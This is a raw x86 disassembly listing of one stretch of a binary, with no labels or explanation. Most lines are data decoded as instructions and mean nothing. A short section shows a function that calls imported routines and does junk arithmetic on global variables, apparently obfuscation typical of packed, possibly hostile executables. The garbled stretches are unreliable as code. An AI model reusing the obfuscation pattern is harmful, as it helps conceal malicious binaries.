  41729f:	out    0xb0,al
  4172a1:	push   ebx
  4172a2:	and    al,BYTE PTR [edx]
  4172a4:	outs   dx,DWORD PTR ds:[esi]
  4172a5:	mov    ah,0xe4
  4172a7:	into   
  4172a8:	jmp    0x490d:0xf2b73f3f
  4172af:	sahf   
  4172b0:	in     al,0x8d
  4172b2:	ffreep st(6)
  4172b4:	mov    al,0x30
  4172b6:	nop
  4172b7:	ror    DWORD PTR [edi-0x75],cl
  4172ba:	and    BYTE PTR [esi-0x37],dh
  4172bd:	ins    DWORD PTR es:[edi],dx
  4172be:	fcomi  st,st(1)
  4172c0:	in     eax,dx
  4172c1:	mov    eax,0xdb8d3142
  4172c6:	mov    ebp,0x67cdf99e
  4172cb:	pop    ss
  4172cc:	les    ebx,FWORD PTR [bx+di+0x52]
  4172d0:	fist   WORD PTR [ebp+0x60b83b6]
  4172d6:	test   BYTE PTR [edx-0x4c2d1307],bl
  4172dc:	test   eax,0xcebfbc08
  4172e1:	xchg   ebp,eax
  4172e2:	icebp  
  4172e3:	cwde   
  4172e4:	ds jns 0x4172f0
  4172e7:	aaa    
  4172e8:	clc    
  4172e9:	je     0x4172f1
  4172eb:	mov    bl,0xcd
  4172ed:	sbb    esi,0x72752aff
  4172f3:	dec    ecx
  4172f4:	jne    0x417323
  4172f6:	das    
  4172f7:	aaa    
  4172f8:	jmp    0xe9ef:0xdeab69f8
  4172ff:	jae    0x417296
  417301:	add    al,0xe
  417303:	cmp    BYTE PTR [ebx-0x4a],dh
  417306:	mov    eax,0xf38a7c9
  41730b:	fnsave [esi+0x4]
  41730e:	outs   dx,BYTE PTR ds:[esi]
  41730f:	inc    edi
  417310:	or     al,0xb1
  417312:	or     al,0xc9
  417314:	mov    ebp,0xfdcd9740
  417319:	adc    eax,0xe764df44
  41731e:	shl    DWORD PTR [edi],1
  417320:	mov    eax,esi
  417322:	jns    0x417384
  417324:	aam    0xac
  417326:	jns    0x41736e
  417328:	dec    ecx
  417329:	shr    dl,0x5d
  41732c:	push   esi
  41732d:	dec    esi
  41732e:	test   eax,0x86ce6d78
  417333:	mov    edx,DWORD PTR [eax]
  417335:	adc    edi,DWORD PTR [ebp-0x4c4bd82c]
  41733b:	dec    eax
  41733c:	pop    esp
  41733d:	fisub  WORD PTR [ebx-0x521a13e6]
  417343:	int    0x9b
  417345:	lahf   
  417346:	push   ss
  417347:	daa    
  417348:	fstp   DWORD PTR [edi-0x63]
  41734b:	mov    ebp,0x9175259a
  417351:	inc    ebx
  417352:	fist   DWORD PTR [esi-0x339e8253]
  417358:	mov    bl,0x59
  41735a:	xlat   BYTE PTR ds:[ebx]
  41735b:	ins    DWORD PTR es:[edi],dx
  41735c:	cmp    ebx,DWORD PTR ds:0x61b90e4a
  417362:	ror    DWORD PTR [esi-0x58675791],cl
  417368:	scas   al,BYTE PTR es:[edi]
  417369:	pop    ebp
  41736a:	inc    eax
  41736b:	mov    ebx,0xba071308
  417370:	addr16 xor bl,dh
  417373:	push   eax
  417374:	dec    ebx
  417375:	pop    ss
  417376:	fstp   DWORD PTR [ebx-0x39]
  417379:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41737b:	cmp    eax,0xc3eb82c9
  417380:	outs   dx,BYTE PTR ds:[esi]
  417381:	sbb    esi,esp
  417383:	dec    esi
  417384:	std    
  417385:	retf   
  417386:	mov    BYTE PTR [edi+eax*2-0x6d0c6651],al
  41738d:	lahf   
  41738e:	mov    al,0xce
  417390:	aam    0x3c
  417392:	scas   eax,DWORD PTR es:[edi]
  417393:	(bad)  
  417394:	stc    
  417395:	xor    dl,bh
  417397:	dec    esi
  417398:	inc    ebx
  417399:	sub    DWORD PTR [edi],0x2f
  41739c:	aam    0xe5
  41739e:	(bad)  
  41739f:	push   es
  4173a0:	stos   BYTE PTR es:[edi],al
  4173a1:	scas   al,BYTE PTR es:[edi]
  4173a2:	xor    DWORD PTR [eax+ebp*2+0x78ce517d],ebp
  4173a9:	test   al,0x4c
  4173ab:	pop    ebp
  4173ac:	std    
  4173ad:	or     BYTE PTR [edi],cl
  4173af:	inc    eax
  4173b0:	and    esi,ecx
  4173b2:	outs   dx,DWORD PTR ds:[esi]
  4173b3:	inc    ebp
  4173b4:	mov    edi,0x842a4798
  4173b9:	jl     0x417364
  4173bb:	or     dl,BYTE PTR ds:0xd1b1d95
  4173c1:	cld    
  4173c2:	inc    esi
  4173c3:	mov    al,ds:0xe392ed0a
  4173c8:	cdq    
  4173c9:	jnp    0x417352
  4173cb:	push   esp
  4173cc:	sub    eax,0x23ef34c9
  4173d1:	(bad)  
  4173d2:	cld    
  4173d3:	xor    dl,BYTE PTR [esi-0x52debd5a]
  4173d9:	nop
  4173da:	pop    ecx
  4173db:	ss mov ebp,0xa57d6b
  4173e1:	mov    ebp,0x507a8293
  4173e6:	ds shl ebp,1
  4173e9:	es jmp 0x417459
  4173ec:	xor    BYTE PTR [ebp+eiz*8-0x40b0b243],bl
  4173f3:	inc    esi
  4173f4:	sbb    eax,0x73
  4173f7:	test   eax,0xecf1335e
  4173fc:	repz cmp al,0x1
  4173ff:	gs sub ebp,esi
  417402:	outs   dx,DWORD PTR ds:[esi]
  417403:	loope  0x41746f
  417405:	cmp    eax,0x5daee0d3
  41740a:	xor    DWORD PTR [esi+0x5d172d91],edi
  417410:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417411:	mov    eax,ds:0xda0eb6f2
  417416:	inc    ebx
  417417:	xor    BYTE PTR [esi-0x41c198ac],bl
  41741d:	sbb    bl,ah
  41741f:	fnstcw WORD PTR [ebx+0x2b27e689]
  417425:	out    dx,al
  417426:	or     esp,DWORD PTR [ecx]
  417428:	push   ss
  417429:	jmp    0xdd9a4ba5
  41742e:	arpl   WORD PTR [ecx+0x5a],cx
  417431:	aad    0x2f
  417433:	test   BYTE PTR [edi+0x1f499e48],al
  417439:	jmp    0x8c8:0x81b29b69
  417440:	lahf   
  417441:	cmp    DWORD PTR [ecx+0x61],eax
  417444:	repz inc eax
  417446:	clc    
  417447:	adc    DWORD PTR [ebp+ecx*4-0x7bb5f2b7],edi
  41744e:	stc    
  41744f:	ffree  st(6)
  417451:	fdivr  DWORD PTR [eax+0x3c]
  417454:	cmp    dh,BYTE PTR [edx+0x43]
  417457:	jmp    0x3864:0x7b15c9a
  41745e:	addr16 jl 0x417434
  417461:	fld    TBYTE PTR [ebx]
  417463:	in     eax,dx
  417464:	call   0xa213a990
  417469:	mov    edx,0x796d7c24
  41746e:	dec    edx
  41746f:	push   esi
  417470:	jecxz  0x417489
  417472:	add    bl,bh
  417474:	lea    ebx,[esi]
  417476:	leave  
  417477:	add    ecx,DWORD PTR [edi+0x16]
  41747a:	loop   0x4174d8
  41747c:	or     bl,BYTE PTR [edi-0x5e574e7c]
  417482:	lds    esp,FWORD PTR [ebp-0x5e]
  417485:	jnp    0x4174bf
  417487:	into   
  417488:	inc    ebx
  417489:	(bad)  
  41748a:	ss pushf 
  41748c:	mov    BYTE PTR [esi],ch
  41748e:	push   ebx
  41748f:	mov    ebp,0x45add93e
  417494:	imul   esp
  417496:	arpl   bp,di
  417498:	pop    es
  417499:	aas    
  41749a:	mov    dh,0x72
  41749c:	test   edx,edx
  41749e:	sub    eax,esp
  4174a0:	and    al,0x77
  4174a2:	call   0x491a972a
  4174a7:	mov    al,ds:0xf5c89d0
  4174ac:	stos   BYTE PTR es:[edi],al
  4174ad:	cmp    cl,BYTE PTR [esi-0x41]
  4174b0:	mov    cl,0x94
  4174b2:	xchg   ebx,eax
  4174b3:	adc    DWORD PTR [ebx-0x2bbe2f77],esp
  4174b9:	pusha  
  4174ba:	dec    edi
  4174bb:	(bad)
  4174be:	pop    edx
  4174bf:	xor    eax,ecx
  4174c1:	sub    edx,eax
  4174c3:	cmp    edi,edx
  4174c5:	jbe    0x4170cf
  4174cb:	pop    edi
  4174cc:	pop    esi
  4174cd:	pop    ebx
  4174ce:	leave  
  4174cf:	ret    0x8
  4174d2:	push   ebp
  4174d3:	mov    ebp,esp
  4174d5:	and    esp,0xfffffff8
  4174d8:	sub    esp,0x9c
  4174de:	push   ebx
  4174df:	push   esi
  4174e0:	push   edi
  4174e1:	push   DWORD PTR ds:0x422384
  4174e7:	lea    eax,[esp+0xa4]
  4174ee:	push   eax
  4174ef:	call   DWORD PTR ds:0x428e20
  4174f5:	push   DWORD PTR [esp+0xa4]
  4174fc:	push   DWORD PTR ds:0x422370
  417502:	call   DWORD PTR ds:0x428e44
  417508:	push   eax
  417509:	call   DWORD PTR ds:0x428e2c
  41750f:	mov    ecx,DWORD PTR ds:0x422738
  417515:	sub    DWORD PTR ds:0x4282bf,0x42833b
  41751f:	jmp    0x4178ee
  417524:	iret   
  417525:	and    ah,BYTE PTR [esi]
  417527:	inc    eax
  417528:	sbb    bh,BYTE PTR [edi+ebp*4]
  41752b:	and    cl,BYTE PTR [ecx+edx*8]
  41752e:	fnstcw WORD PTR [edi+ebp*8+0xa6a08af]
  417535:	out    0x16,eax
  417537:	sbb    BYTE PTR [edx+edx*1-0x76d9e7e8],bh
  41753e:	int    0x28
  417540:	jne    0x4174ed
  417542:	ja     0x417551
  417544:	and    DWORD PTR [esi-0x25],edx
  417547:	loopne 0x4174f4
  417549:	adc    esp,ecx
  41754b:	mov    ah,0xd4
  41754d:	push   eax
  41754e:	xor    dh,bh
  417550:	pusha  
  417551:	cwde   
  417552:	into   
  417553:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417554:	xor    ah,cl
  417556:	mov    ch,0x73
  417558:	or     eax,0xb6bb0a18
  41755d:	xchg   esi,eax
  41755e:	iret   
  41755f:	mov    ch,0x71
  417561:	ret    0x30f0
  417564:	(bad)  
  417565:	(bad)  
  417566:	std    
  417567:	xchg   DWORD PTR gs:[ebp-0x2d],edi
  41756b:	pop    edx
  41756c:	sbb    ch,BYTE PTR [eax-0x67]
  41756f:	jae    0x41754b
  417571:	clc    
  417572:	inc    esp
  417573:	jns    0x41755c
  417575:	rcl    dl,cl
  417577:	jb     0x4175bd
  417579:	push   edx
  41757a:	repnz and eax,0xcee38e9b
  417580:	sub    DWORD PTR [edx-0x1ed28669],ebx
  417586:	es jb  0x417562
  417589:	outs   dx,DWORD PTR ds:[esi]
  41758a:	mov    ah,0x1b
  41758c:	push   ss
  41758d:	sub    eax,0x228e854f
  417592:	jl     0x4175cb
  417594:	fldenv [esi]
  417596:	inc    edx
  417597:	or     ah,BYTE PTR [ebp-0x631ea2ab]
  41759d:	mov    bh,0x2c
  41759f:	lahf   
  4175a0:	retf   0x2193
  4175a3:	adc    BYTE PTR [edi+0x45],bl
  4175a6:	pop    es
  4175a7:	sub    cl,BYTE PTR [esi+0x1d]
  4175aa:	or     esi,DWORD PTR [ecx+0x83e29aa]
  4175b0:	data16 je 0x417539
  4175b3:	jnp    0x41762f
  4175b5:	ret    0x82a7
  4175b8:	nop
  4175b9:	hlt    
  4175ba:	sbb    al,0xfb
  4175bc:	mov    bh,0x8e
  4175be:	sbb    ecx,eax
  4175c0:	repnz in eax,dx
  4175c2:	(bad)  
  4175c3:	mov    ds:0xdd2a0d00,eax
  4175c8:	mov    DWORD PTR [esi],edi
  4175ca:	ins    DWORD PTR es:[edi],dx
  4175cb:	(bad)  
  4175cc:	jo     0x4175fb
  4175ce:	pop    edx
  4175cf:	xchg   ebx,eax
  4175d0:	movhlps xmm3,xmm0
  4175d3:	call   0xc1ae1b5
  4175d8:	(bad)  
  4175d9:	(bad)  [eax-0x18ada9d8]
  4175df:	rcl    DWORD PTR [edx-0x21],0x52
  4175e3:	push   esi
  4175e4:	pop    esi
  4175e5:	(bad)  
  4175e6:	or     eax,0xc9d0d126
  4175eb:	xchg   ebx,edx
  4175ed:	dec    ebx
  4175ee:	(bad)  
  4175ef:	leave  
  4175f0:	add    ecx,DWORD PTR [ebp+esi*8-0x4047a885]
  4175f7:	pop    esp
  4175f8:	mov    ah,0xb1
  4175fa:	mov    dh,0x26
  4175fc:	xor    DWORD PTR [esi+0x33e85dc],esi
  417602:	push   ecx
  417603:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417604:	pop    ebp
  417605:	jbe    0x4175e0
  417607:	out    dx,al
  417608:	ins    DWORD PTR es:[di],dx
  41760a:	or     ebx,eax
  41760c:	jae    0x41759d
  41760e:	repnz inc ecx
  417610:	push   ebx
  417611:	ret    
  417612:	ret    0x1901
  417615:	gs in  al,0x52
  417618:	out    dx,al
  417619:	fstp   TBYTE PTR [edi+0x5e]
  41761c:	hlt    
  41761d:	lods   eax,DWORD PTR ds:[esi]
  41761e:	sbb    esi,ecx
  417620:	push   esp
  417621:	adc    eax,0xd70e502b
  417626:	outs   dx,DWORD PTR ds:[esi]
  417627:	fmulp  st(2),st
  417629:	in     eax,dx
  41762a:	iret   
  41762b:	sbb    DWORD PTR [esp+ebp*1+0x19613f39],esp
  417632:	mul    DWORD PTR [edx-0x689169ec]
  417638:	inc    esi
  417639:	ficom  WORD PTR [edi]
  41763b:	xor    BYTE PTR [eax+0x74204398],dl
  417641:	bound  edi,QWORD PTR [eax-0x231a9202]
  417647:	bound  edx,QWORD PTR [ebx-0x4d]
  41764a:	imul   edi,DWORD PTR fs:[ebx+0xc],0xffffff8b
  41764f:	xor    BYTE PTR [edi+ebx*2+0x721db047],0x8
  417657:	jmp    0x5479b4ed
  41765c:	xchg   esi,eax
  41765d:	mov    WORD PTR [eax],cs
  41765f:	daa    
  417660:	ins    DWORD PTR es:[edi],dx
  417661:	inc    esi
  417662:	and    ebx,esp
  417664:	out    dx,eax
  417665:	ror    BYTE PTR [esp+edi*4],cl
  417668:	(bad)  
  417669:	cmc    
  41766a:	fisttp QWORD PTR [ecx]
  41766c:	inc    esp
  41766d:	retf   0x8ac9
  417670:	xchg   ebx,eax
  417671:	div    DWORD PTR [ebx+0x4dc6ac75]
  417677:	outs   dx,DWORD PTR ds:[esi]
  417678:	jp     0x417624
  41767a:	and    DWORD PTR [ebx],edi
  41767c:	aas    
  41767d:	add    ebp,DWORD PTR [ebx+0x55]
  417680:	inc    esp
  417681:	arpl   WORD PTR [ebx-0x7d],sp
  417684:	(bad)  
  417686:	mov    esi,0xee5dcc6c
  41768b:	retf   0xbbb3
  41768e:	push   edx
  41768f:	mov    esi,DWORD PTR [ecx+edx*2]
  417692:	pop    ecx
  417693:	test   BYTE PTR [eax+0x174c4337],bh
  417699:	jb     0x4176da
  41769b:	fisttp DWORD PTR [edx+0x55]
  41769e:	jno    0x417628
  4176a0:	leave  
  4176a1:	push   es
  4176a2:	(bad)  
  4176a3:	xchg   ebx,eax
  4176a4:	push   edi
  4176a5:	mov    bl,0xec
  4176a7:	xor    DWORD PTR [ecx-0x25],esi
  4176aa:	out    dx,eax
  4176ab:	ins    DWORD PTR es:[edi],dx
  4176ac:	mov    ch,0x79
  4176ae:	inc    ebx
  4176af:	mov    edx,?
  4176b1:	or     eax,0xa8fe7c6d
  4176b6:	xlat   BYTE PTR ds:[ebx]
  4176b7:	lods   al,BYTE PTR ds:[esi]
  4176b8:	and    al,0xe0
  4176ba:	xchg   edx,eax
  4176bb:	or     al,0xf4
  4176bd:	or     eax,0xf6ef4948
  4176c2:	loope  0x41766f
  4176c4:	push   cs
  4176c5:	lods   eax,DWORD PTR ds:[esi]
  4176c6:	imul   DWORD PTR ds:0xaeed85e9
  4176cc:	push   ds
  4176cd:	sahf   
  4176ce:	mov    BYTE PTR [eax+0x1d590c78],bh
  4176d4:	fwait
  4176d5:	xchg   ebp,eax
  4176d6:	xchg   edi,eax
  4176d7:	add    eax,0x4a3e6cf7
  4176dc:	xlat   BYTE PTR ds:[ebx]
  4176dd:	or     al,0x94
  4176df:	adc    BYTE PTR [edx-0x6bd9275b],bl
  4176e5:	outs   dx,DWORD PTR ds:[esi]
  4176e6:	jne    0x41775a
  4176e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176e9:	out    0xca,eax
  4176eb:	lahf   
  4176ec:	arpl   WORD PTR [edi-0x1281db70],di
  4176f2:	fs shl bl,cl
  4176f5:	adc    al,0xb5
  4176f7:	ins    BYTE PTR es:[edi],dx
  4176f8:	xor    eax,0xd3662330
  4176fd:	pop    esp
  4176fe:	or     eax,0x99ed775e
  417703:	idiv   DWORD PTR [ecx+0xe6f8f0c]
  417709:	scas   eax,DWORD PTR es:[edi]
  41770a:	add    eax,0xf507942
  41770f:	jne    0x4176ff
  417711:	dec    eax
  417712:	cwde   
  417713:	push   esi
  417714:	adc    eax,0xae670a1b
  417719:	pop    ds
  41771a:	adc    eax,0x8ad3e946
  41771f:	hlt    
  417720:	push   eax
  417721:	inc    ecx
  417722:	lods   eax,DWORD PTR ds:[esi]
  417723:	cld    
  417724:	loopne 0x4176c2
  417726:	ins    BYTE PTR es:[edi],dx
  417727:	sub    edx,DWORD PTR [ecx+0x5b]
  41772a:	mov    cl,0xf6
  41772c:	inc    edi
  41772d:	push   ss
  41772e:	ins    BYTE PTR es:[edi],dx
  41772f:	push   ebx
  417730:	mov    ds:0x7130d36b,eax
  417735:	outs   dx,DWORD PTR ds:[esi]
  417736:	cld    
  417737:	xchg   BYTE PTR [eax],dh
  417739:	sub    eax,0xafdb2b06
  41773e:	sbb    ebx,DWORD PTR [edx-0xe]
  417741:	fs mov cl,0x6c
  417744:	inc    eax
  417745:	test   DWORD PTR [edx],ebp
  417747:	(bad)  
  417748:	stc    
  417749:	dec    edx
  41774a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41774b:	test   DWORD PTR [ecx+ecx*4],esp
  41774e:	add    DWORD PTR [esi+0x293378b0],ebp
  417754:	leave  
  417755:	jmp    0xf02c:0xcce9866a
  41775c:	inc    ebx
  41775d:	std    
  41775e:	fucomp st(1)
  417760:	rcr    BYTE PTR [eax],cl
  417762:	xor    bl,BYTE PTR [ebx-0x1a]
  417765:	xor    al,0x6c
  417767:	je     0x41773f
  417769:	mov    edi,0x505235f7
  41776e:	mov    al,0xde
  417770:	jae    0x417734
  417772:	add    eax,0xe5ab6768
  417777:	sub    BYTE PTR [edi-0x60],0xb6
  41777b:	(bad)  
  41777c:	xchg   ecx,eax
  41777d:	loopne 0x4177df
  41777f:	test   BYTE PTR [ebp+0x75],dh
  417782:	scas   al,BYTE PTR es:[edi]
  417783:	pop    ds
  417784:	mov    cl,dh
  417786:	mov    cs,WORD PTR [esi+0x6f6e1c0f]
  41778c:	inc    esi
  41778d:	or     ecx,DWORD PTR [esi+0x4d]
  417790:	inc    edx
  417791:	inc    esp
  417792:	sahf   
  417793:	nop
  417794:	es pop edx
  417796:	inc    edi
  417797:	mov    cs,WORD PTR [ebp+0x1d]
  41779a:	dec    ebp
  41779b:	pop    edi
  41779c:	int    0x88
  41779e:	ds hlt 
  4177a0:	mov    ds:0x44b94cb4,eax
  4177a5:	xchg   DWORD PTR [eax-0x314bafff],esi
  4177ab:	and    ecx,DWORD PTR [edi+0x5a8498d2]
  4177b1:	dec    ebp
  4177b2:	mov    esi,0x8111b9c3
  4177b7:	imul   esi,DWORD PTR [edi+0x7a451236],0x2
  4177be:	iret   
  4177bf:	hlt    
  4177c0:	sbb    DWORD PTR [ebp-0x705857cc],eax
  4177c6:	xchg   ebx,eax
  4177c7:	sbb    eax,0xe8603fe6
  4177cc:	push   cs
  4177cd:	adc    edx,DWORD PTR ds:0xbaa6c637
  4177d3:	mov    dh,0xba
  4177d5:	adc    DWORD PTR [ecx+eax*1],eax
  4177d8:	outs   dx,DWORD PTR ds:[esi]
  4177d9:	jmp    0xe1299511
  4177de:	push   esp
  4177df:	pop    ss
  4177e0:	outs   dx,DWORD PTR ds:[esi]
  4177e1:	pusha  
  4177e2:	lea    esi,ds:0xe7f5cdb
  4177e8:	repnz sbb eax,0xb72daa65
  4177ee:	jg     0x417865
  4177f0:	jmp    0x4177f3
  4177f2:	(bad)  
  4177f3:	ror    DWORD PTR [ebx+0x509ca25],1
  4177f9:	mov    ss,ecx
  4177fb:	mov    esi,0xa2a185cf
  417800:	fmul   QWORD PTR [edx]
  417802:	arpl   WORD PTR [esi],di
  417804:	mov    ah,0x7f
  417806:	mov    ebx,0xfffa2c70
  41780b:	in     eax,0x4f
  41780d:	push   cs
  41780e:	jbe    0x417878
  417810:	push   0x2c14dc9f
  417815:	jbe    0x4177e2
  417817:	inc    ecx
  417818:	pop    edi
  417819:	repnz pop esi
  41781b:	hlt    
  41781c:	stc    
  41781d:	jmp    0x4177dd
  41781f:	dec    esi
  417820:	jo     0x4177bd
  417822:	push   cs
  417823:	fldenv [esi]
  417825:	ret    
  417826:	ror    BYTE PTR [esi+0x3c],cl
  417829:	jnp    0x4177c1
  41782b:	add    ah,BYTE PTR [esi+0x310d05a2]
  417831:	ror    DWORD PTR [ebx+0x1c],1
  417834:	stos   BYTE PTR es:[edi],al
  417835:	es sub ah,ah
  417838:	xor    esi,DWORD PTR [ebx+0x3e80372e]
  41783e:	ins    DWORD PTR es:[edi],dx
  41783f:	cdq    
  417840:	out    0x85,al
  417842:	mov    eax,ds:0x2d34fa87
  417847:	jae    0x4178c7
  417849:	popa   
  41784a:	cmp    eax,0xbb92d3b1
  41784f:	fcom   QWORD PTR [ebp+0x7529a1e8]
  417855:	scas   eax,DWORD PTR es:[edi]
  417856:	mov    dh,BYTE PTR [ecx-0x78d18c29]
  41785c:	int3   
  41785d:	sub    cl,BYTE PTR [ebp-0x6ba1bd22]
  417863:	and    eax,DWORD PTR [ebp+0x3b77ffec]
  417869:	dec    esi
  41786a:	adc    BYTE PTR [ebx-0xc6bbfc9],0xa3
  417871:	out    dx,al
  417872:	mov    bh,0xcb
  417874:	out    dx,al
  417875:	add    DWORD PTR [edx],esi
  417877:	and    BYTE PTR [ecx-0x60],bl
  41787a:	popf   
  41787b:	xlat   BYTE PTR ds:[ebx]
  41787c:	add    eax,0x2659cf59
  417881:	stos   DWORD PTR es:[edi],eax
  417882:	adc    cl,BYTE PTR [ebx]
  417884:	(bad)  
  417885:	dec    esp
  417886:	rol    bl,cl
  417888:	test   DWORD PTR fs:[esi],edx
  41788b:	lods   eax,DWORD PTR ds:[esi]
  41788c:	rcr    BYTE PTR [ebx-0x1e],0x15
  417890:	fs icebp 
  417892:	push   esp
  417893:	mov    eax,0x5bbab093
  417898:	aad    0xf0
  41789a:	add    bl,cl
  41789c:	scas   al,BYTE PTR es:[edi]
  41789d:	push   eax
  41789e:	inc    edi
  41789f:	jne    0x417866
  4178a1:	and    BYTE PTR es:[ebp+0x310f7f04],ah
  4178a8:	mov    ah,0x84
  4178aa:	fs pop edx
  4178ac:	pushf  
  4178ad:	int    0x37
  4178af:	cld    
  4178b0:	(bad)  
  4178b2:	in     eax,0x2f
  4178b4:	ret    0x717f
  4178b7:	mov    ebx,0xa0219759
  4178bc:	shr    BYTE PTR [esi+0x72],1
  4178bf:	loopne 0x417846
  4178c1:	cld    
  4178c2:	mov    esp,0xe114f3ec
  4178c7:	inc    ebp
  4178c8:	add    edx,ecx
  4178ca:	inc    eax
  4178cb:	daa    
  4178cc:	jle    0x417892
  4178ce:	or     edi,DWORD PTR [edi+0x5e71e8fd]
  4178d4:	test   BYTE PTR [ebx-0x3440b3e0],bh
  4178da:	sti    
  4178db:	add    al,0x5f
  4178dd:	aas    
  4178de:	sub    bh,BYTE PTR [edx+0x41]
  4178e1:	fld    QWORD PTR [ebx+0x44]
  4178e4:	ins    BYTE PTR es:[edi],dx
  4178e5:	adc    ch,ch
  4178e7:	(bad)  
  4178e8:	shl    DWORD PTR [ecx-0x77],1
  4178eb:	fmul   DWORD PTR [ecx]
  4178ed:	pop    edi
  4178ee:	push   0x0
  4178f0:	and    DWORD PTR ds:0x428257,0x6fb6
  4178fa:	push   DWORD PTR [ecx]
  4178fc:	or     DWORD PTR ds:0x4281f7,0x652f
  417906:	call   eax
  417908:	adc    esi,DWORD PTR ds:0x42820f
  41790e:	mov    esi,0x1ff
  417913:	add    eax,eax
  417915:	mov    DWORD PTR [esp+0x24],0x3992
  41791d:	mov    DWORD PTR [esp+0xc],0x79a2
  417925:	add    DWORD PTR ds:0x4281f7,0x3f4a
  41792f:	mov    eax,DWORD PTR [esp+0xc]
  417933:	mov    ecx,DWORD PTR ds:0x428297
  417939:	mov    ecx,DWORD PTR [ecx]
  41793b:	and    DWORD PTR ds:0x42825f,ecx
  417941:	mov    ecx,DWORD PTR [esp+0x24]
  417945:	sub    DWORD PTR ds:0x42820f,0x428217
  41794f:	xor    eax,0x1d22
  417954:	xor    DWORD PTR ds:0x4282d3,0x3de5
  41795e:	imul   eax,eax,0xffffdeb4
  417964:	and    eax,0x43eb
  417969:	sub    eax,ecx
  41796b:	xor    DWORD PTR ds:0x42822f,0x42815b
  417975:	mov    DWORD PTR [esp+0x3c],eax
  417979:	xor    DWORD PTR ds:0x42811b,0x24fe
  417983:	mov    DWORD PTR [esp+0x38],0x3b18
  41798b:	mov    DWORD PTR [esp+0x2c],0x6c93
  417993:	adc    DWORD PTR ds:0x42821f,0x3367
  41799d:	mov    DWORD PTR [esp+0x24],0x418e
  4179a5:	add    DWORD PTR ds:0x42825b,ebx
  4179ab:	mov    DWORD PTR [esp+0xc],0x5ac3
  4179b3:	xor    ecx,ecx
  4179b5:	add    ecx,DWORD PTR ds:0x428367
  4179bb:	add    DWORD PTR ds:0x42812b,ecx
  4179c1:	mov    eax,DWORD PTR [esp+0xc]
  4179c5:	mov    ecx,DWORD PTR [esp+0x24]
  4179c9:	add    DWORD PTR ds:0x428253,0x705
  4179d3:	sub    ecx,eax
  4179d5:	and    eax,0x1ffb
  4179da:	mov    eax,DWORD PTR [esp+0x2c]
  4179de:	and    ecx,eax
  4179e0:	mov    eax,DWORD PTR [esp+0x38]
  4179e4:	sbb    DWORD PTR ds:0x428113,0x42832f
  4179ee:	xor    ecx,0x10d6
  4179f4:	sub    ecx,0x782c
  4179fa:	imul   ecx,eax
  4179fd:	mov    eax,0x7fd0
  417a02:	mov    eax,DWORD PTR [esp+0x3c]
  417a06:	cmp    eax,ecx
  417a08:	mov    DWORD PTR ds:0x42812b,0x7353
  417a12:	jne    0x41890f
  417a18:	and    eax,eax
  417a1a:	mov    DWORD PTR [esp+0x10],0x1
  417a22:	mov    DWORD PTR [esp+0x30],0x2f16
  417a2a:	xor    ecx,DWORD PTR ds:0x428217
  417a30:	mov    DWORD PTR [esp+0x48],0x16f
  417a38:	mov    DWORD PTR [esp+0x50],0x30c5
  417a40:	add    DWORD PTR ds:0x4282b7,edx
  417a46:	push   DWORD PTR ds:0xe5bfd6f1
  417a4c:	cmp    DWORD PTR ds:0x428233,0x0
  417a53:	mov    DWORD PTR ds:0x4282af,edx
  417a59:	mov    ecx,0x328
  417a5e:	mov    ecx,0x6d04
  417a63:	jmp    0x417abd
  417a68:	mov    DWORD PTR ds:0x428227,0x44f5
  417a72:	cmp    DWORD PTR ds:0x428233,0x0
  417a79:	je     0x417a9d
  417a7f:	push   DWORD PTR [ebp-0x18]
  417a82:	push   DWORD PTR [ebp-0x18]
  417a85:	push   0x8f00
  417a8a:	push   DWORD PTR [ebp-0x10]
  417a8d:	call   DWORD PTR ds:0x428da4
  417a93:	not    ecx
  417a95:	sub    ecx,ecx
  417a97:	or     DWORD PTR ds:0x428207,ebx
  417a9d:	mov    ecx,DWORD PTR ds:0x428293
  417aa3:	mov    ecx,DWORD PTR [ecx]
  417aa5:	and    DWORD PTR ds:0x42814b,ecx
  417aab:	sbb    ecx,0x5390
  417ab1:	add    ecx,0xb3f
  417ab7:	add    DWORD PTR ds:0x42815b,edi
  417abd:	mov    DWORD PTR [esp+0x8c],0x4ebc
  417ac8:	xor    eax,eax
  417aca:	mov    DWORD PTR [esp+0x98],0x76
  417ad5:	mov    DWORD PTR [esp+0x40],0x556d
  417add:	neg    DWORD PTR ds:0x42811f
  417ae3:	jmp    0x417eb2
  417ae8:	(bad)  [eax-0x2]
  417aec:	xor    BYTE PTR [edx+0x1a],bh
  417aef:	fwait
  417af0:	clc    
  417af1:	dec    edi
  417af2:	arpl   WORD PTR [eax+ecx*1-0x5181f528],di
  417af9:	loope  0x417b11
  417afb:	sbb    BYTE PTR [edx+edx*1-0x2200e7e8],bh
  417b02:	jmp    0xee245e00
  417b07:	sub    bl,BYTE PTR [edi]
  417b09:	sub    al,0x14
  417b0b:	sbb    ch,BYTE PTR [ebp-0x24]
  417b0e:	pop    ss
  417b0f:	(bad)  
  417b10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b11:	pop    ebx
  417b12:	add    eax,0x14f6b38
  417b17:	xchg   BYTE PTR [edi-0x3e],cl
  417b1a:	inc    edi
  417b1b:	xchg   ebx,eax
  417b1c:	cmp    bl,dh
  417b1e:	sbb    eax,0x149ac35c
  417b23:	xor    dl,BYTE PTR [ebp+0x1a5c9e7b]
  417b29:	xchg   esp,eax
  417b2a:	xchg   dh,al
  417b2c:	jg     0x417b4a
  417b2e:	sub    edi,esi
  417b30:	push   esp
  417b31:	inc    esp
  417b32:	inc    edi
  417b33:	adc    al,0x15
  417b35:	mov    ecx,0x74c52003
  417b3a:	jmp    0x417b1a
  417b3c:	jb     0x417b22
  417b3e:	jecxz  0x417b71
  417b40:	inc    edx
  417b41:	xchg   edi,eax
  417b42:	push   ecx
  417b43:	add    eax,0x1d2371c2
  417b48:	aad    0xb
  417b4a:	shl    DWORD PTR gs:[ebx+eax*8+0x5f],cl
  417b4f:	sahf   
  417b50:	xor    esp,DWORD PTR [eax+0x6c]
  417b53:	test   DWORD PTR ds:0x15842b66,ebx
  417b59:	sub    ebx,DWORD PTR [eax+0x6b4dd629]
  417b5f:	aad    0xdc
  417b61:	das    
  417b62:	cmp    eax,ebx
  417b64:	xchg   edx,eax
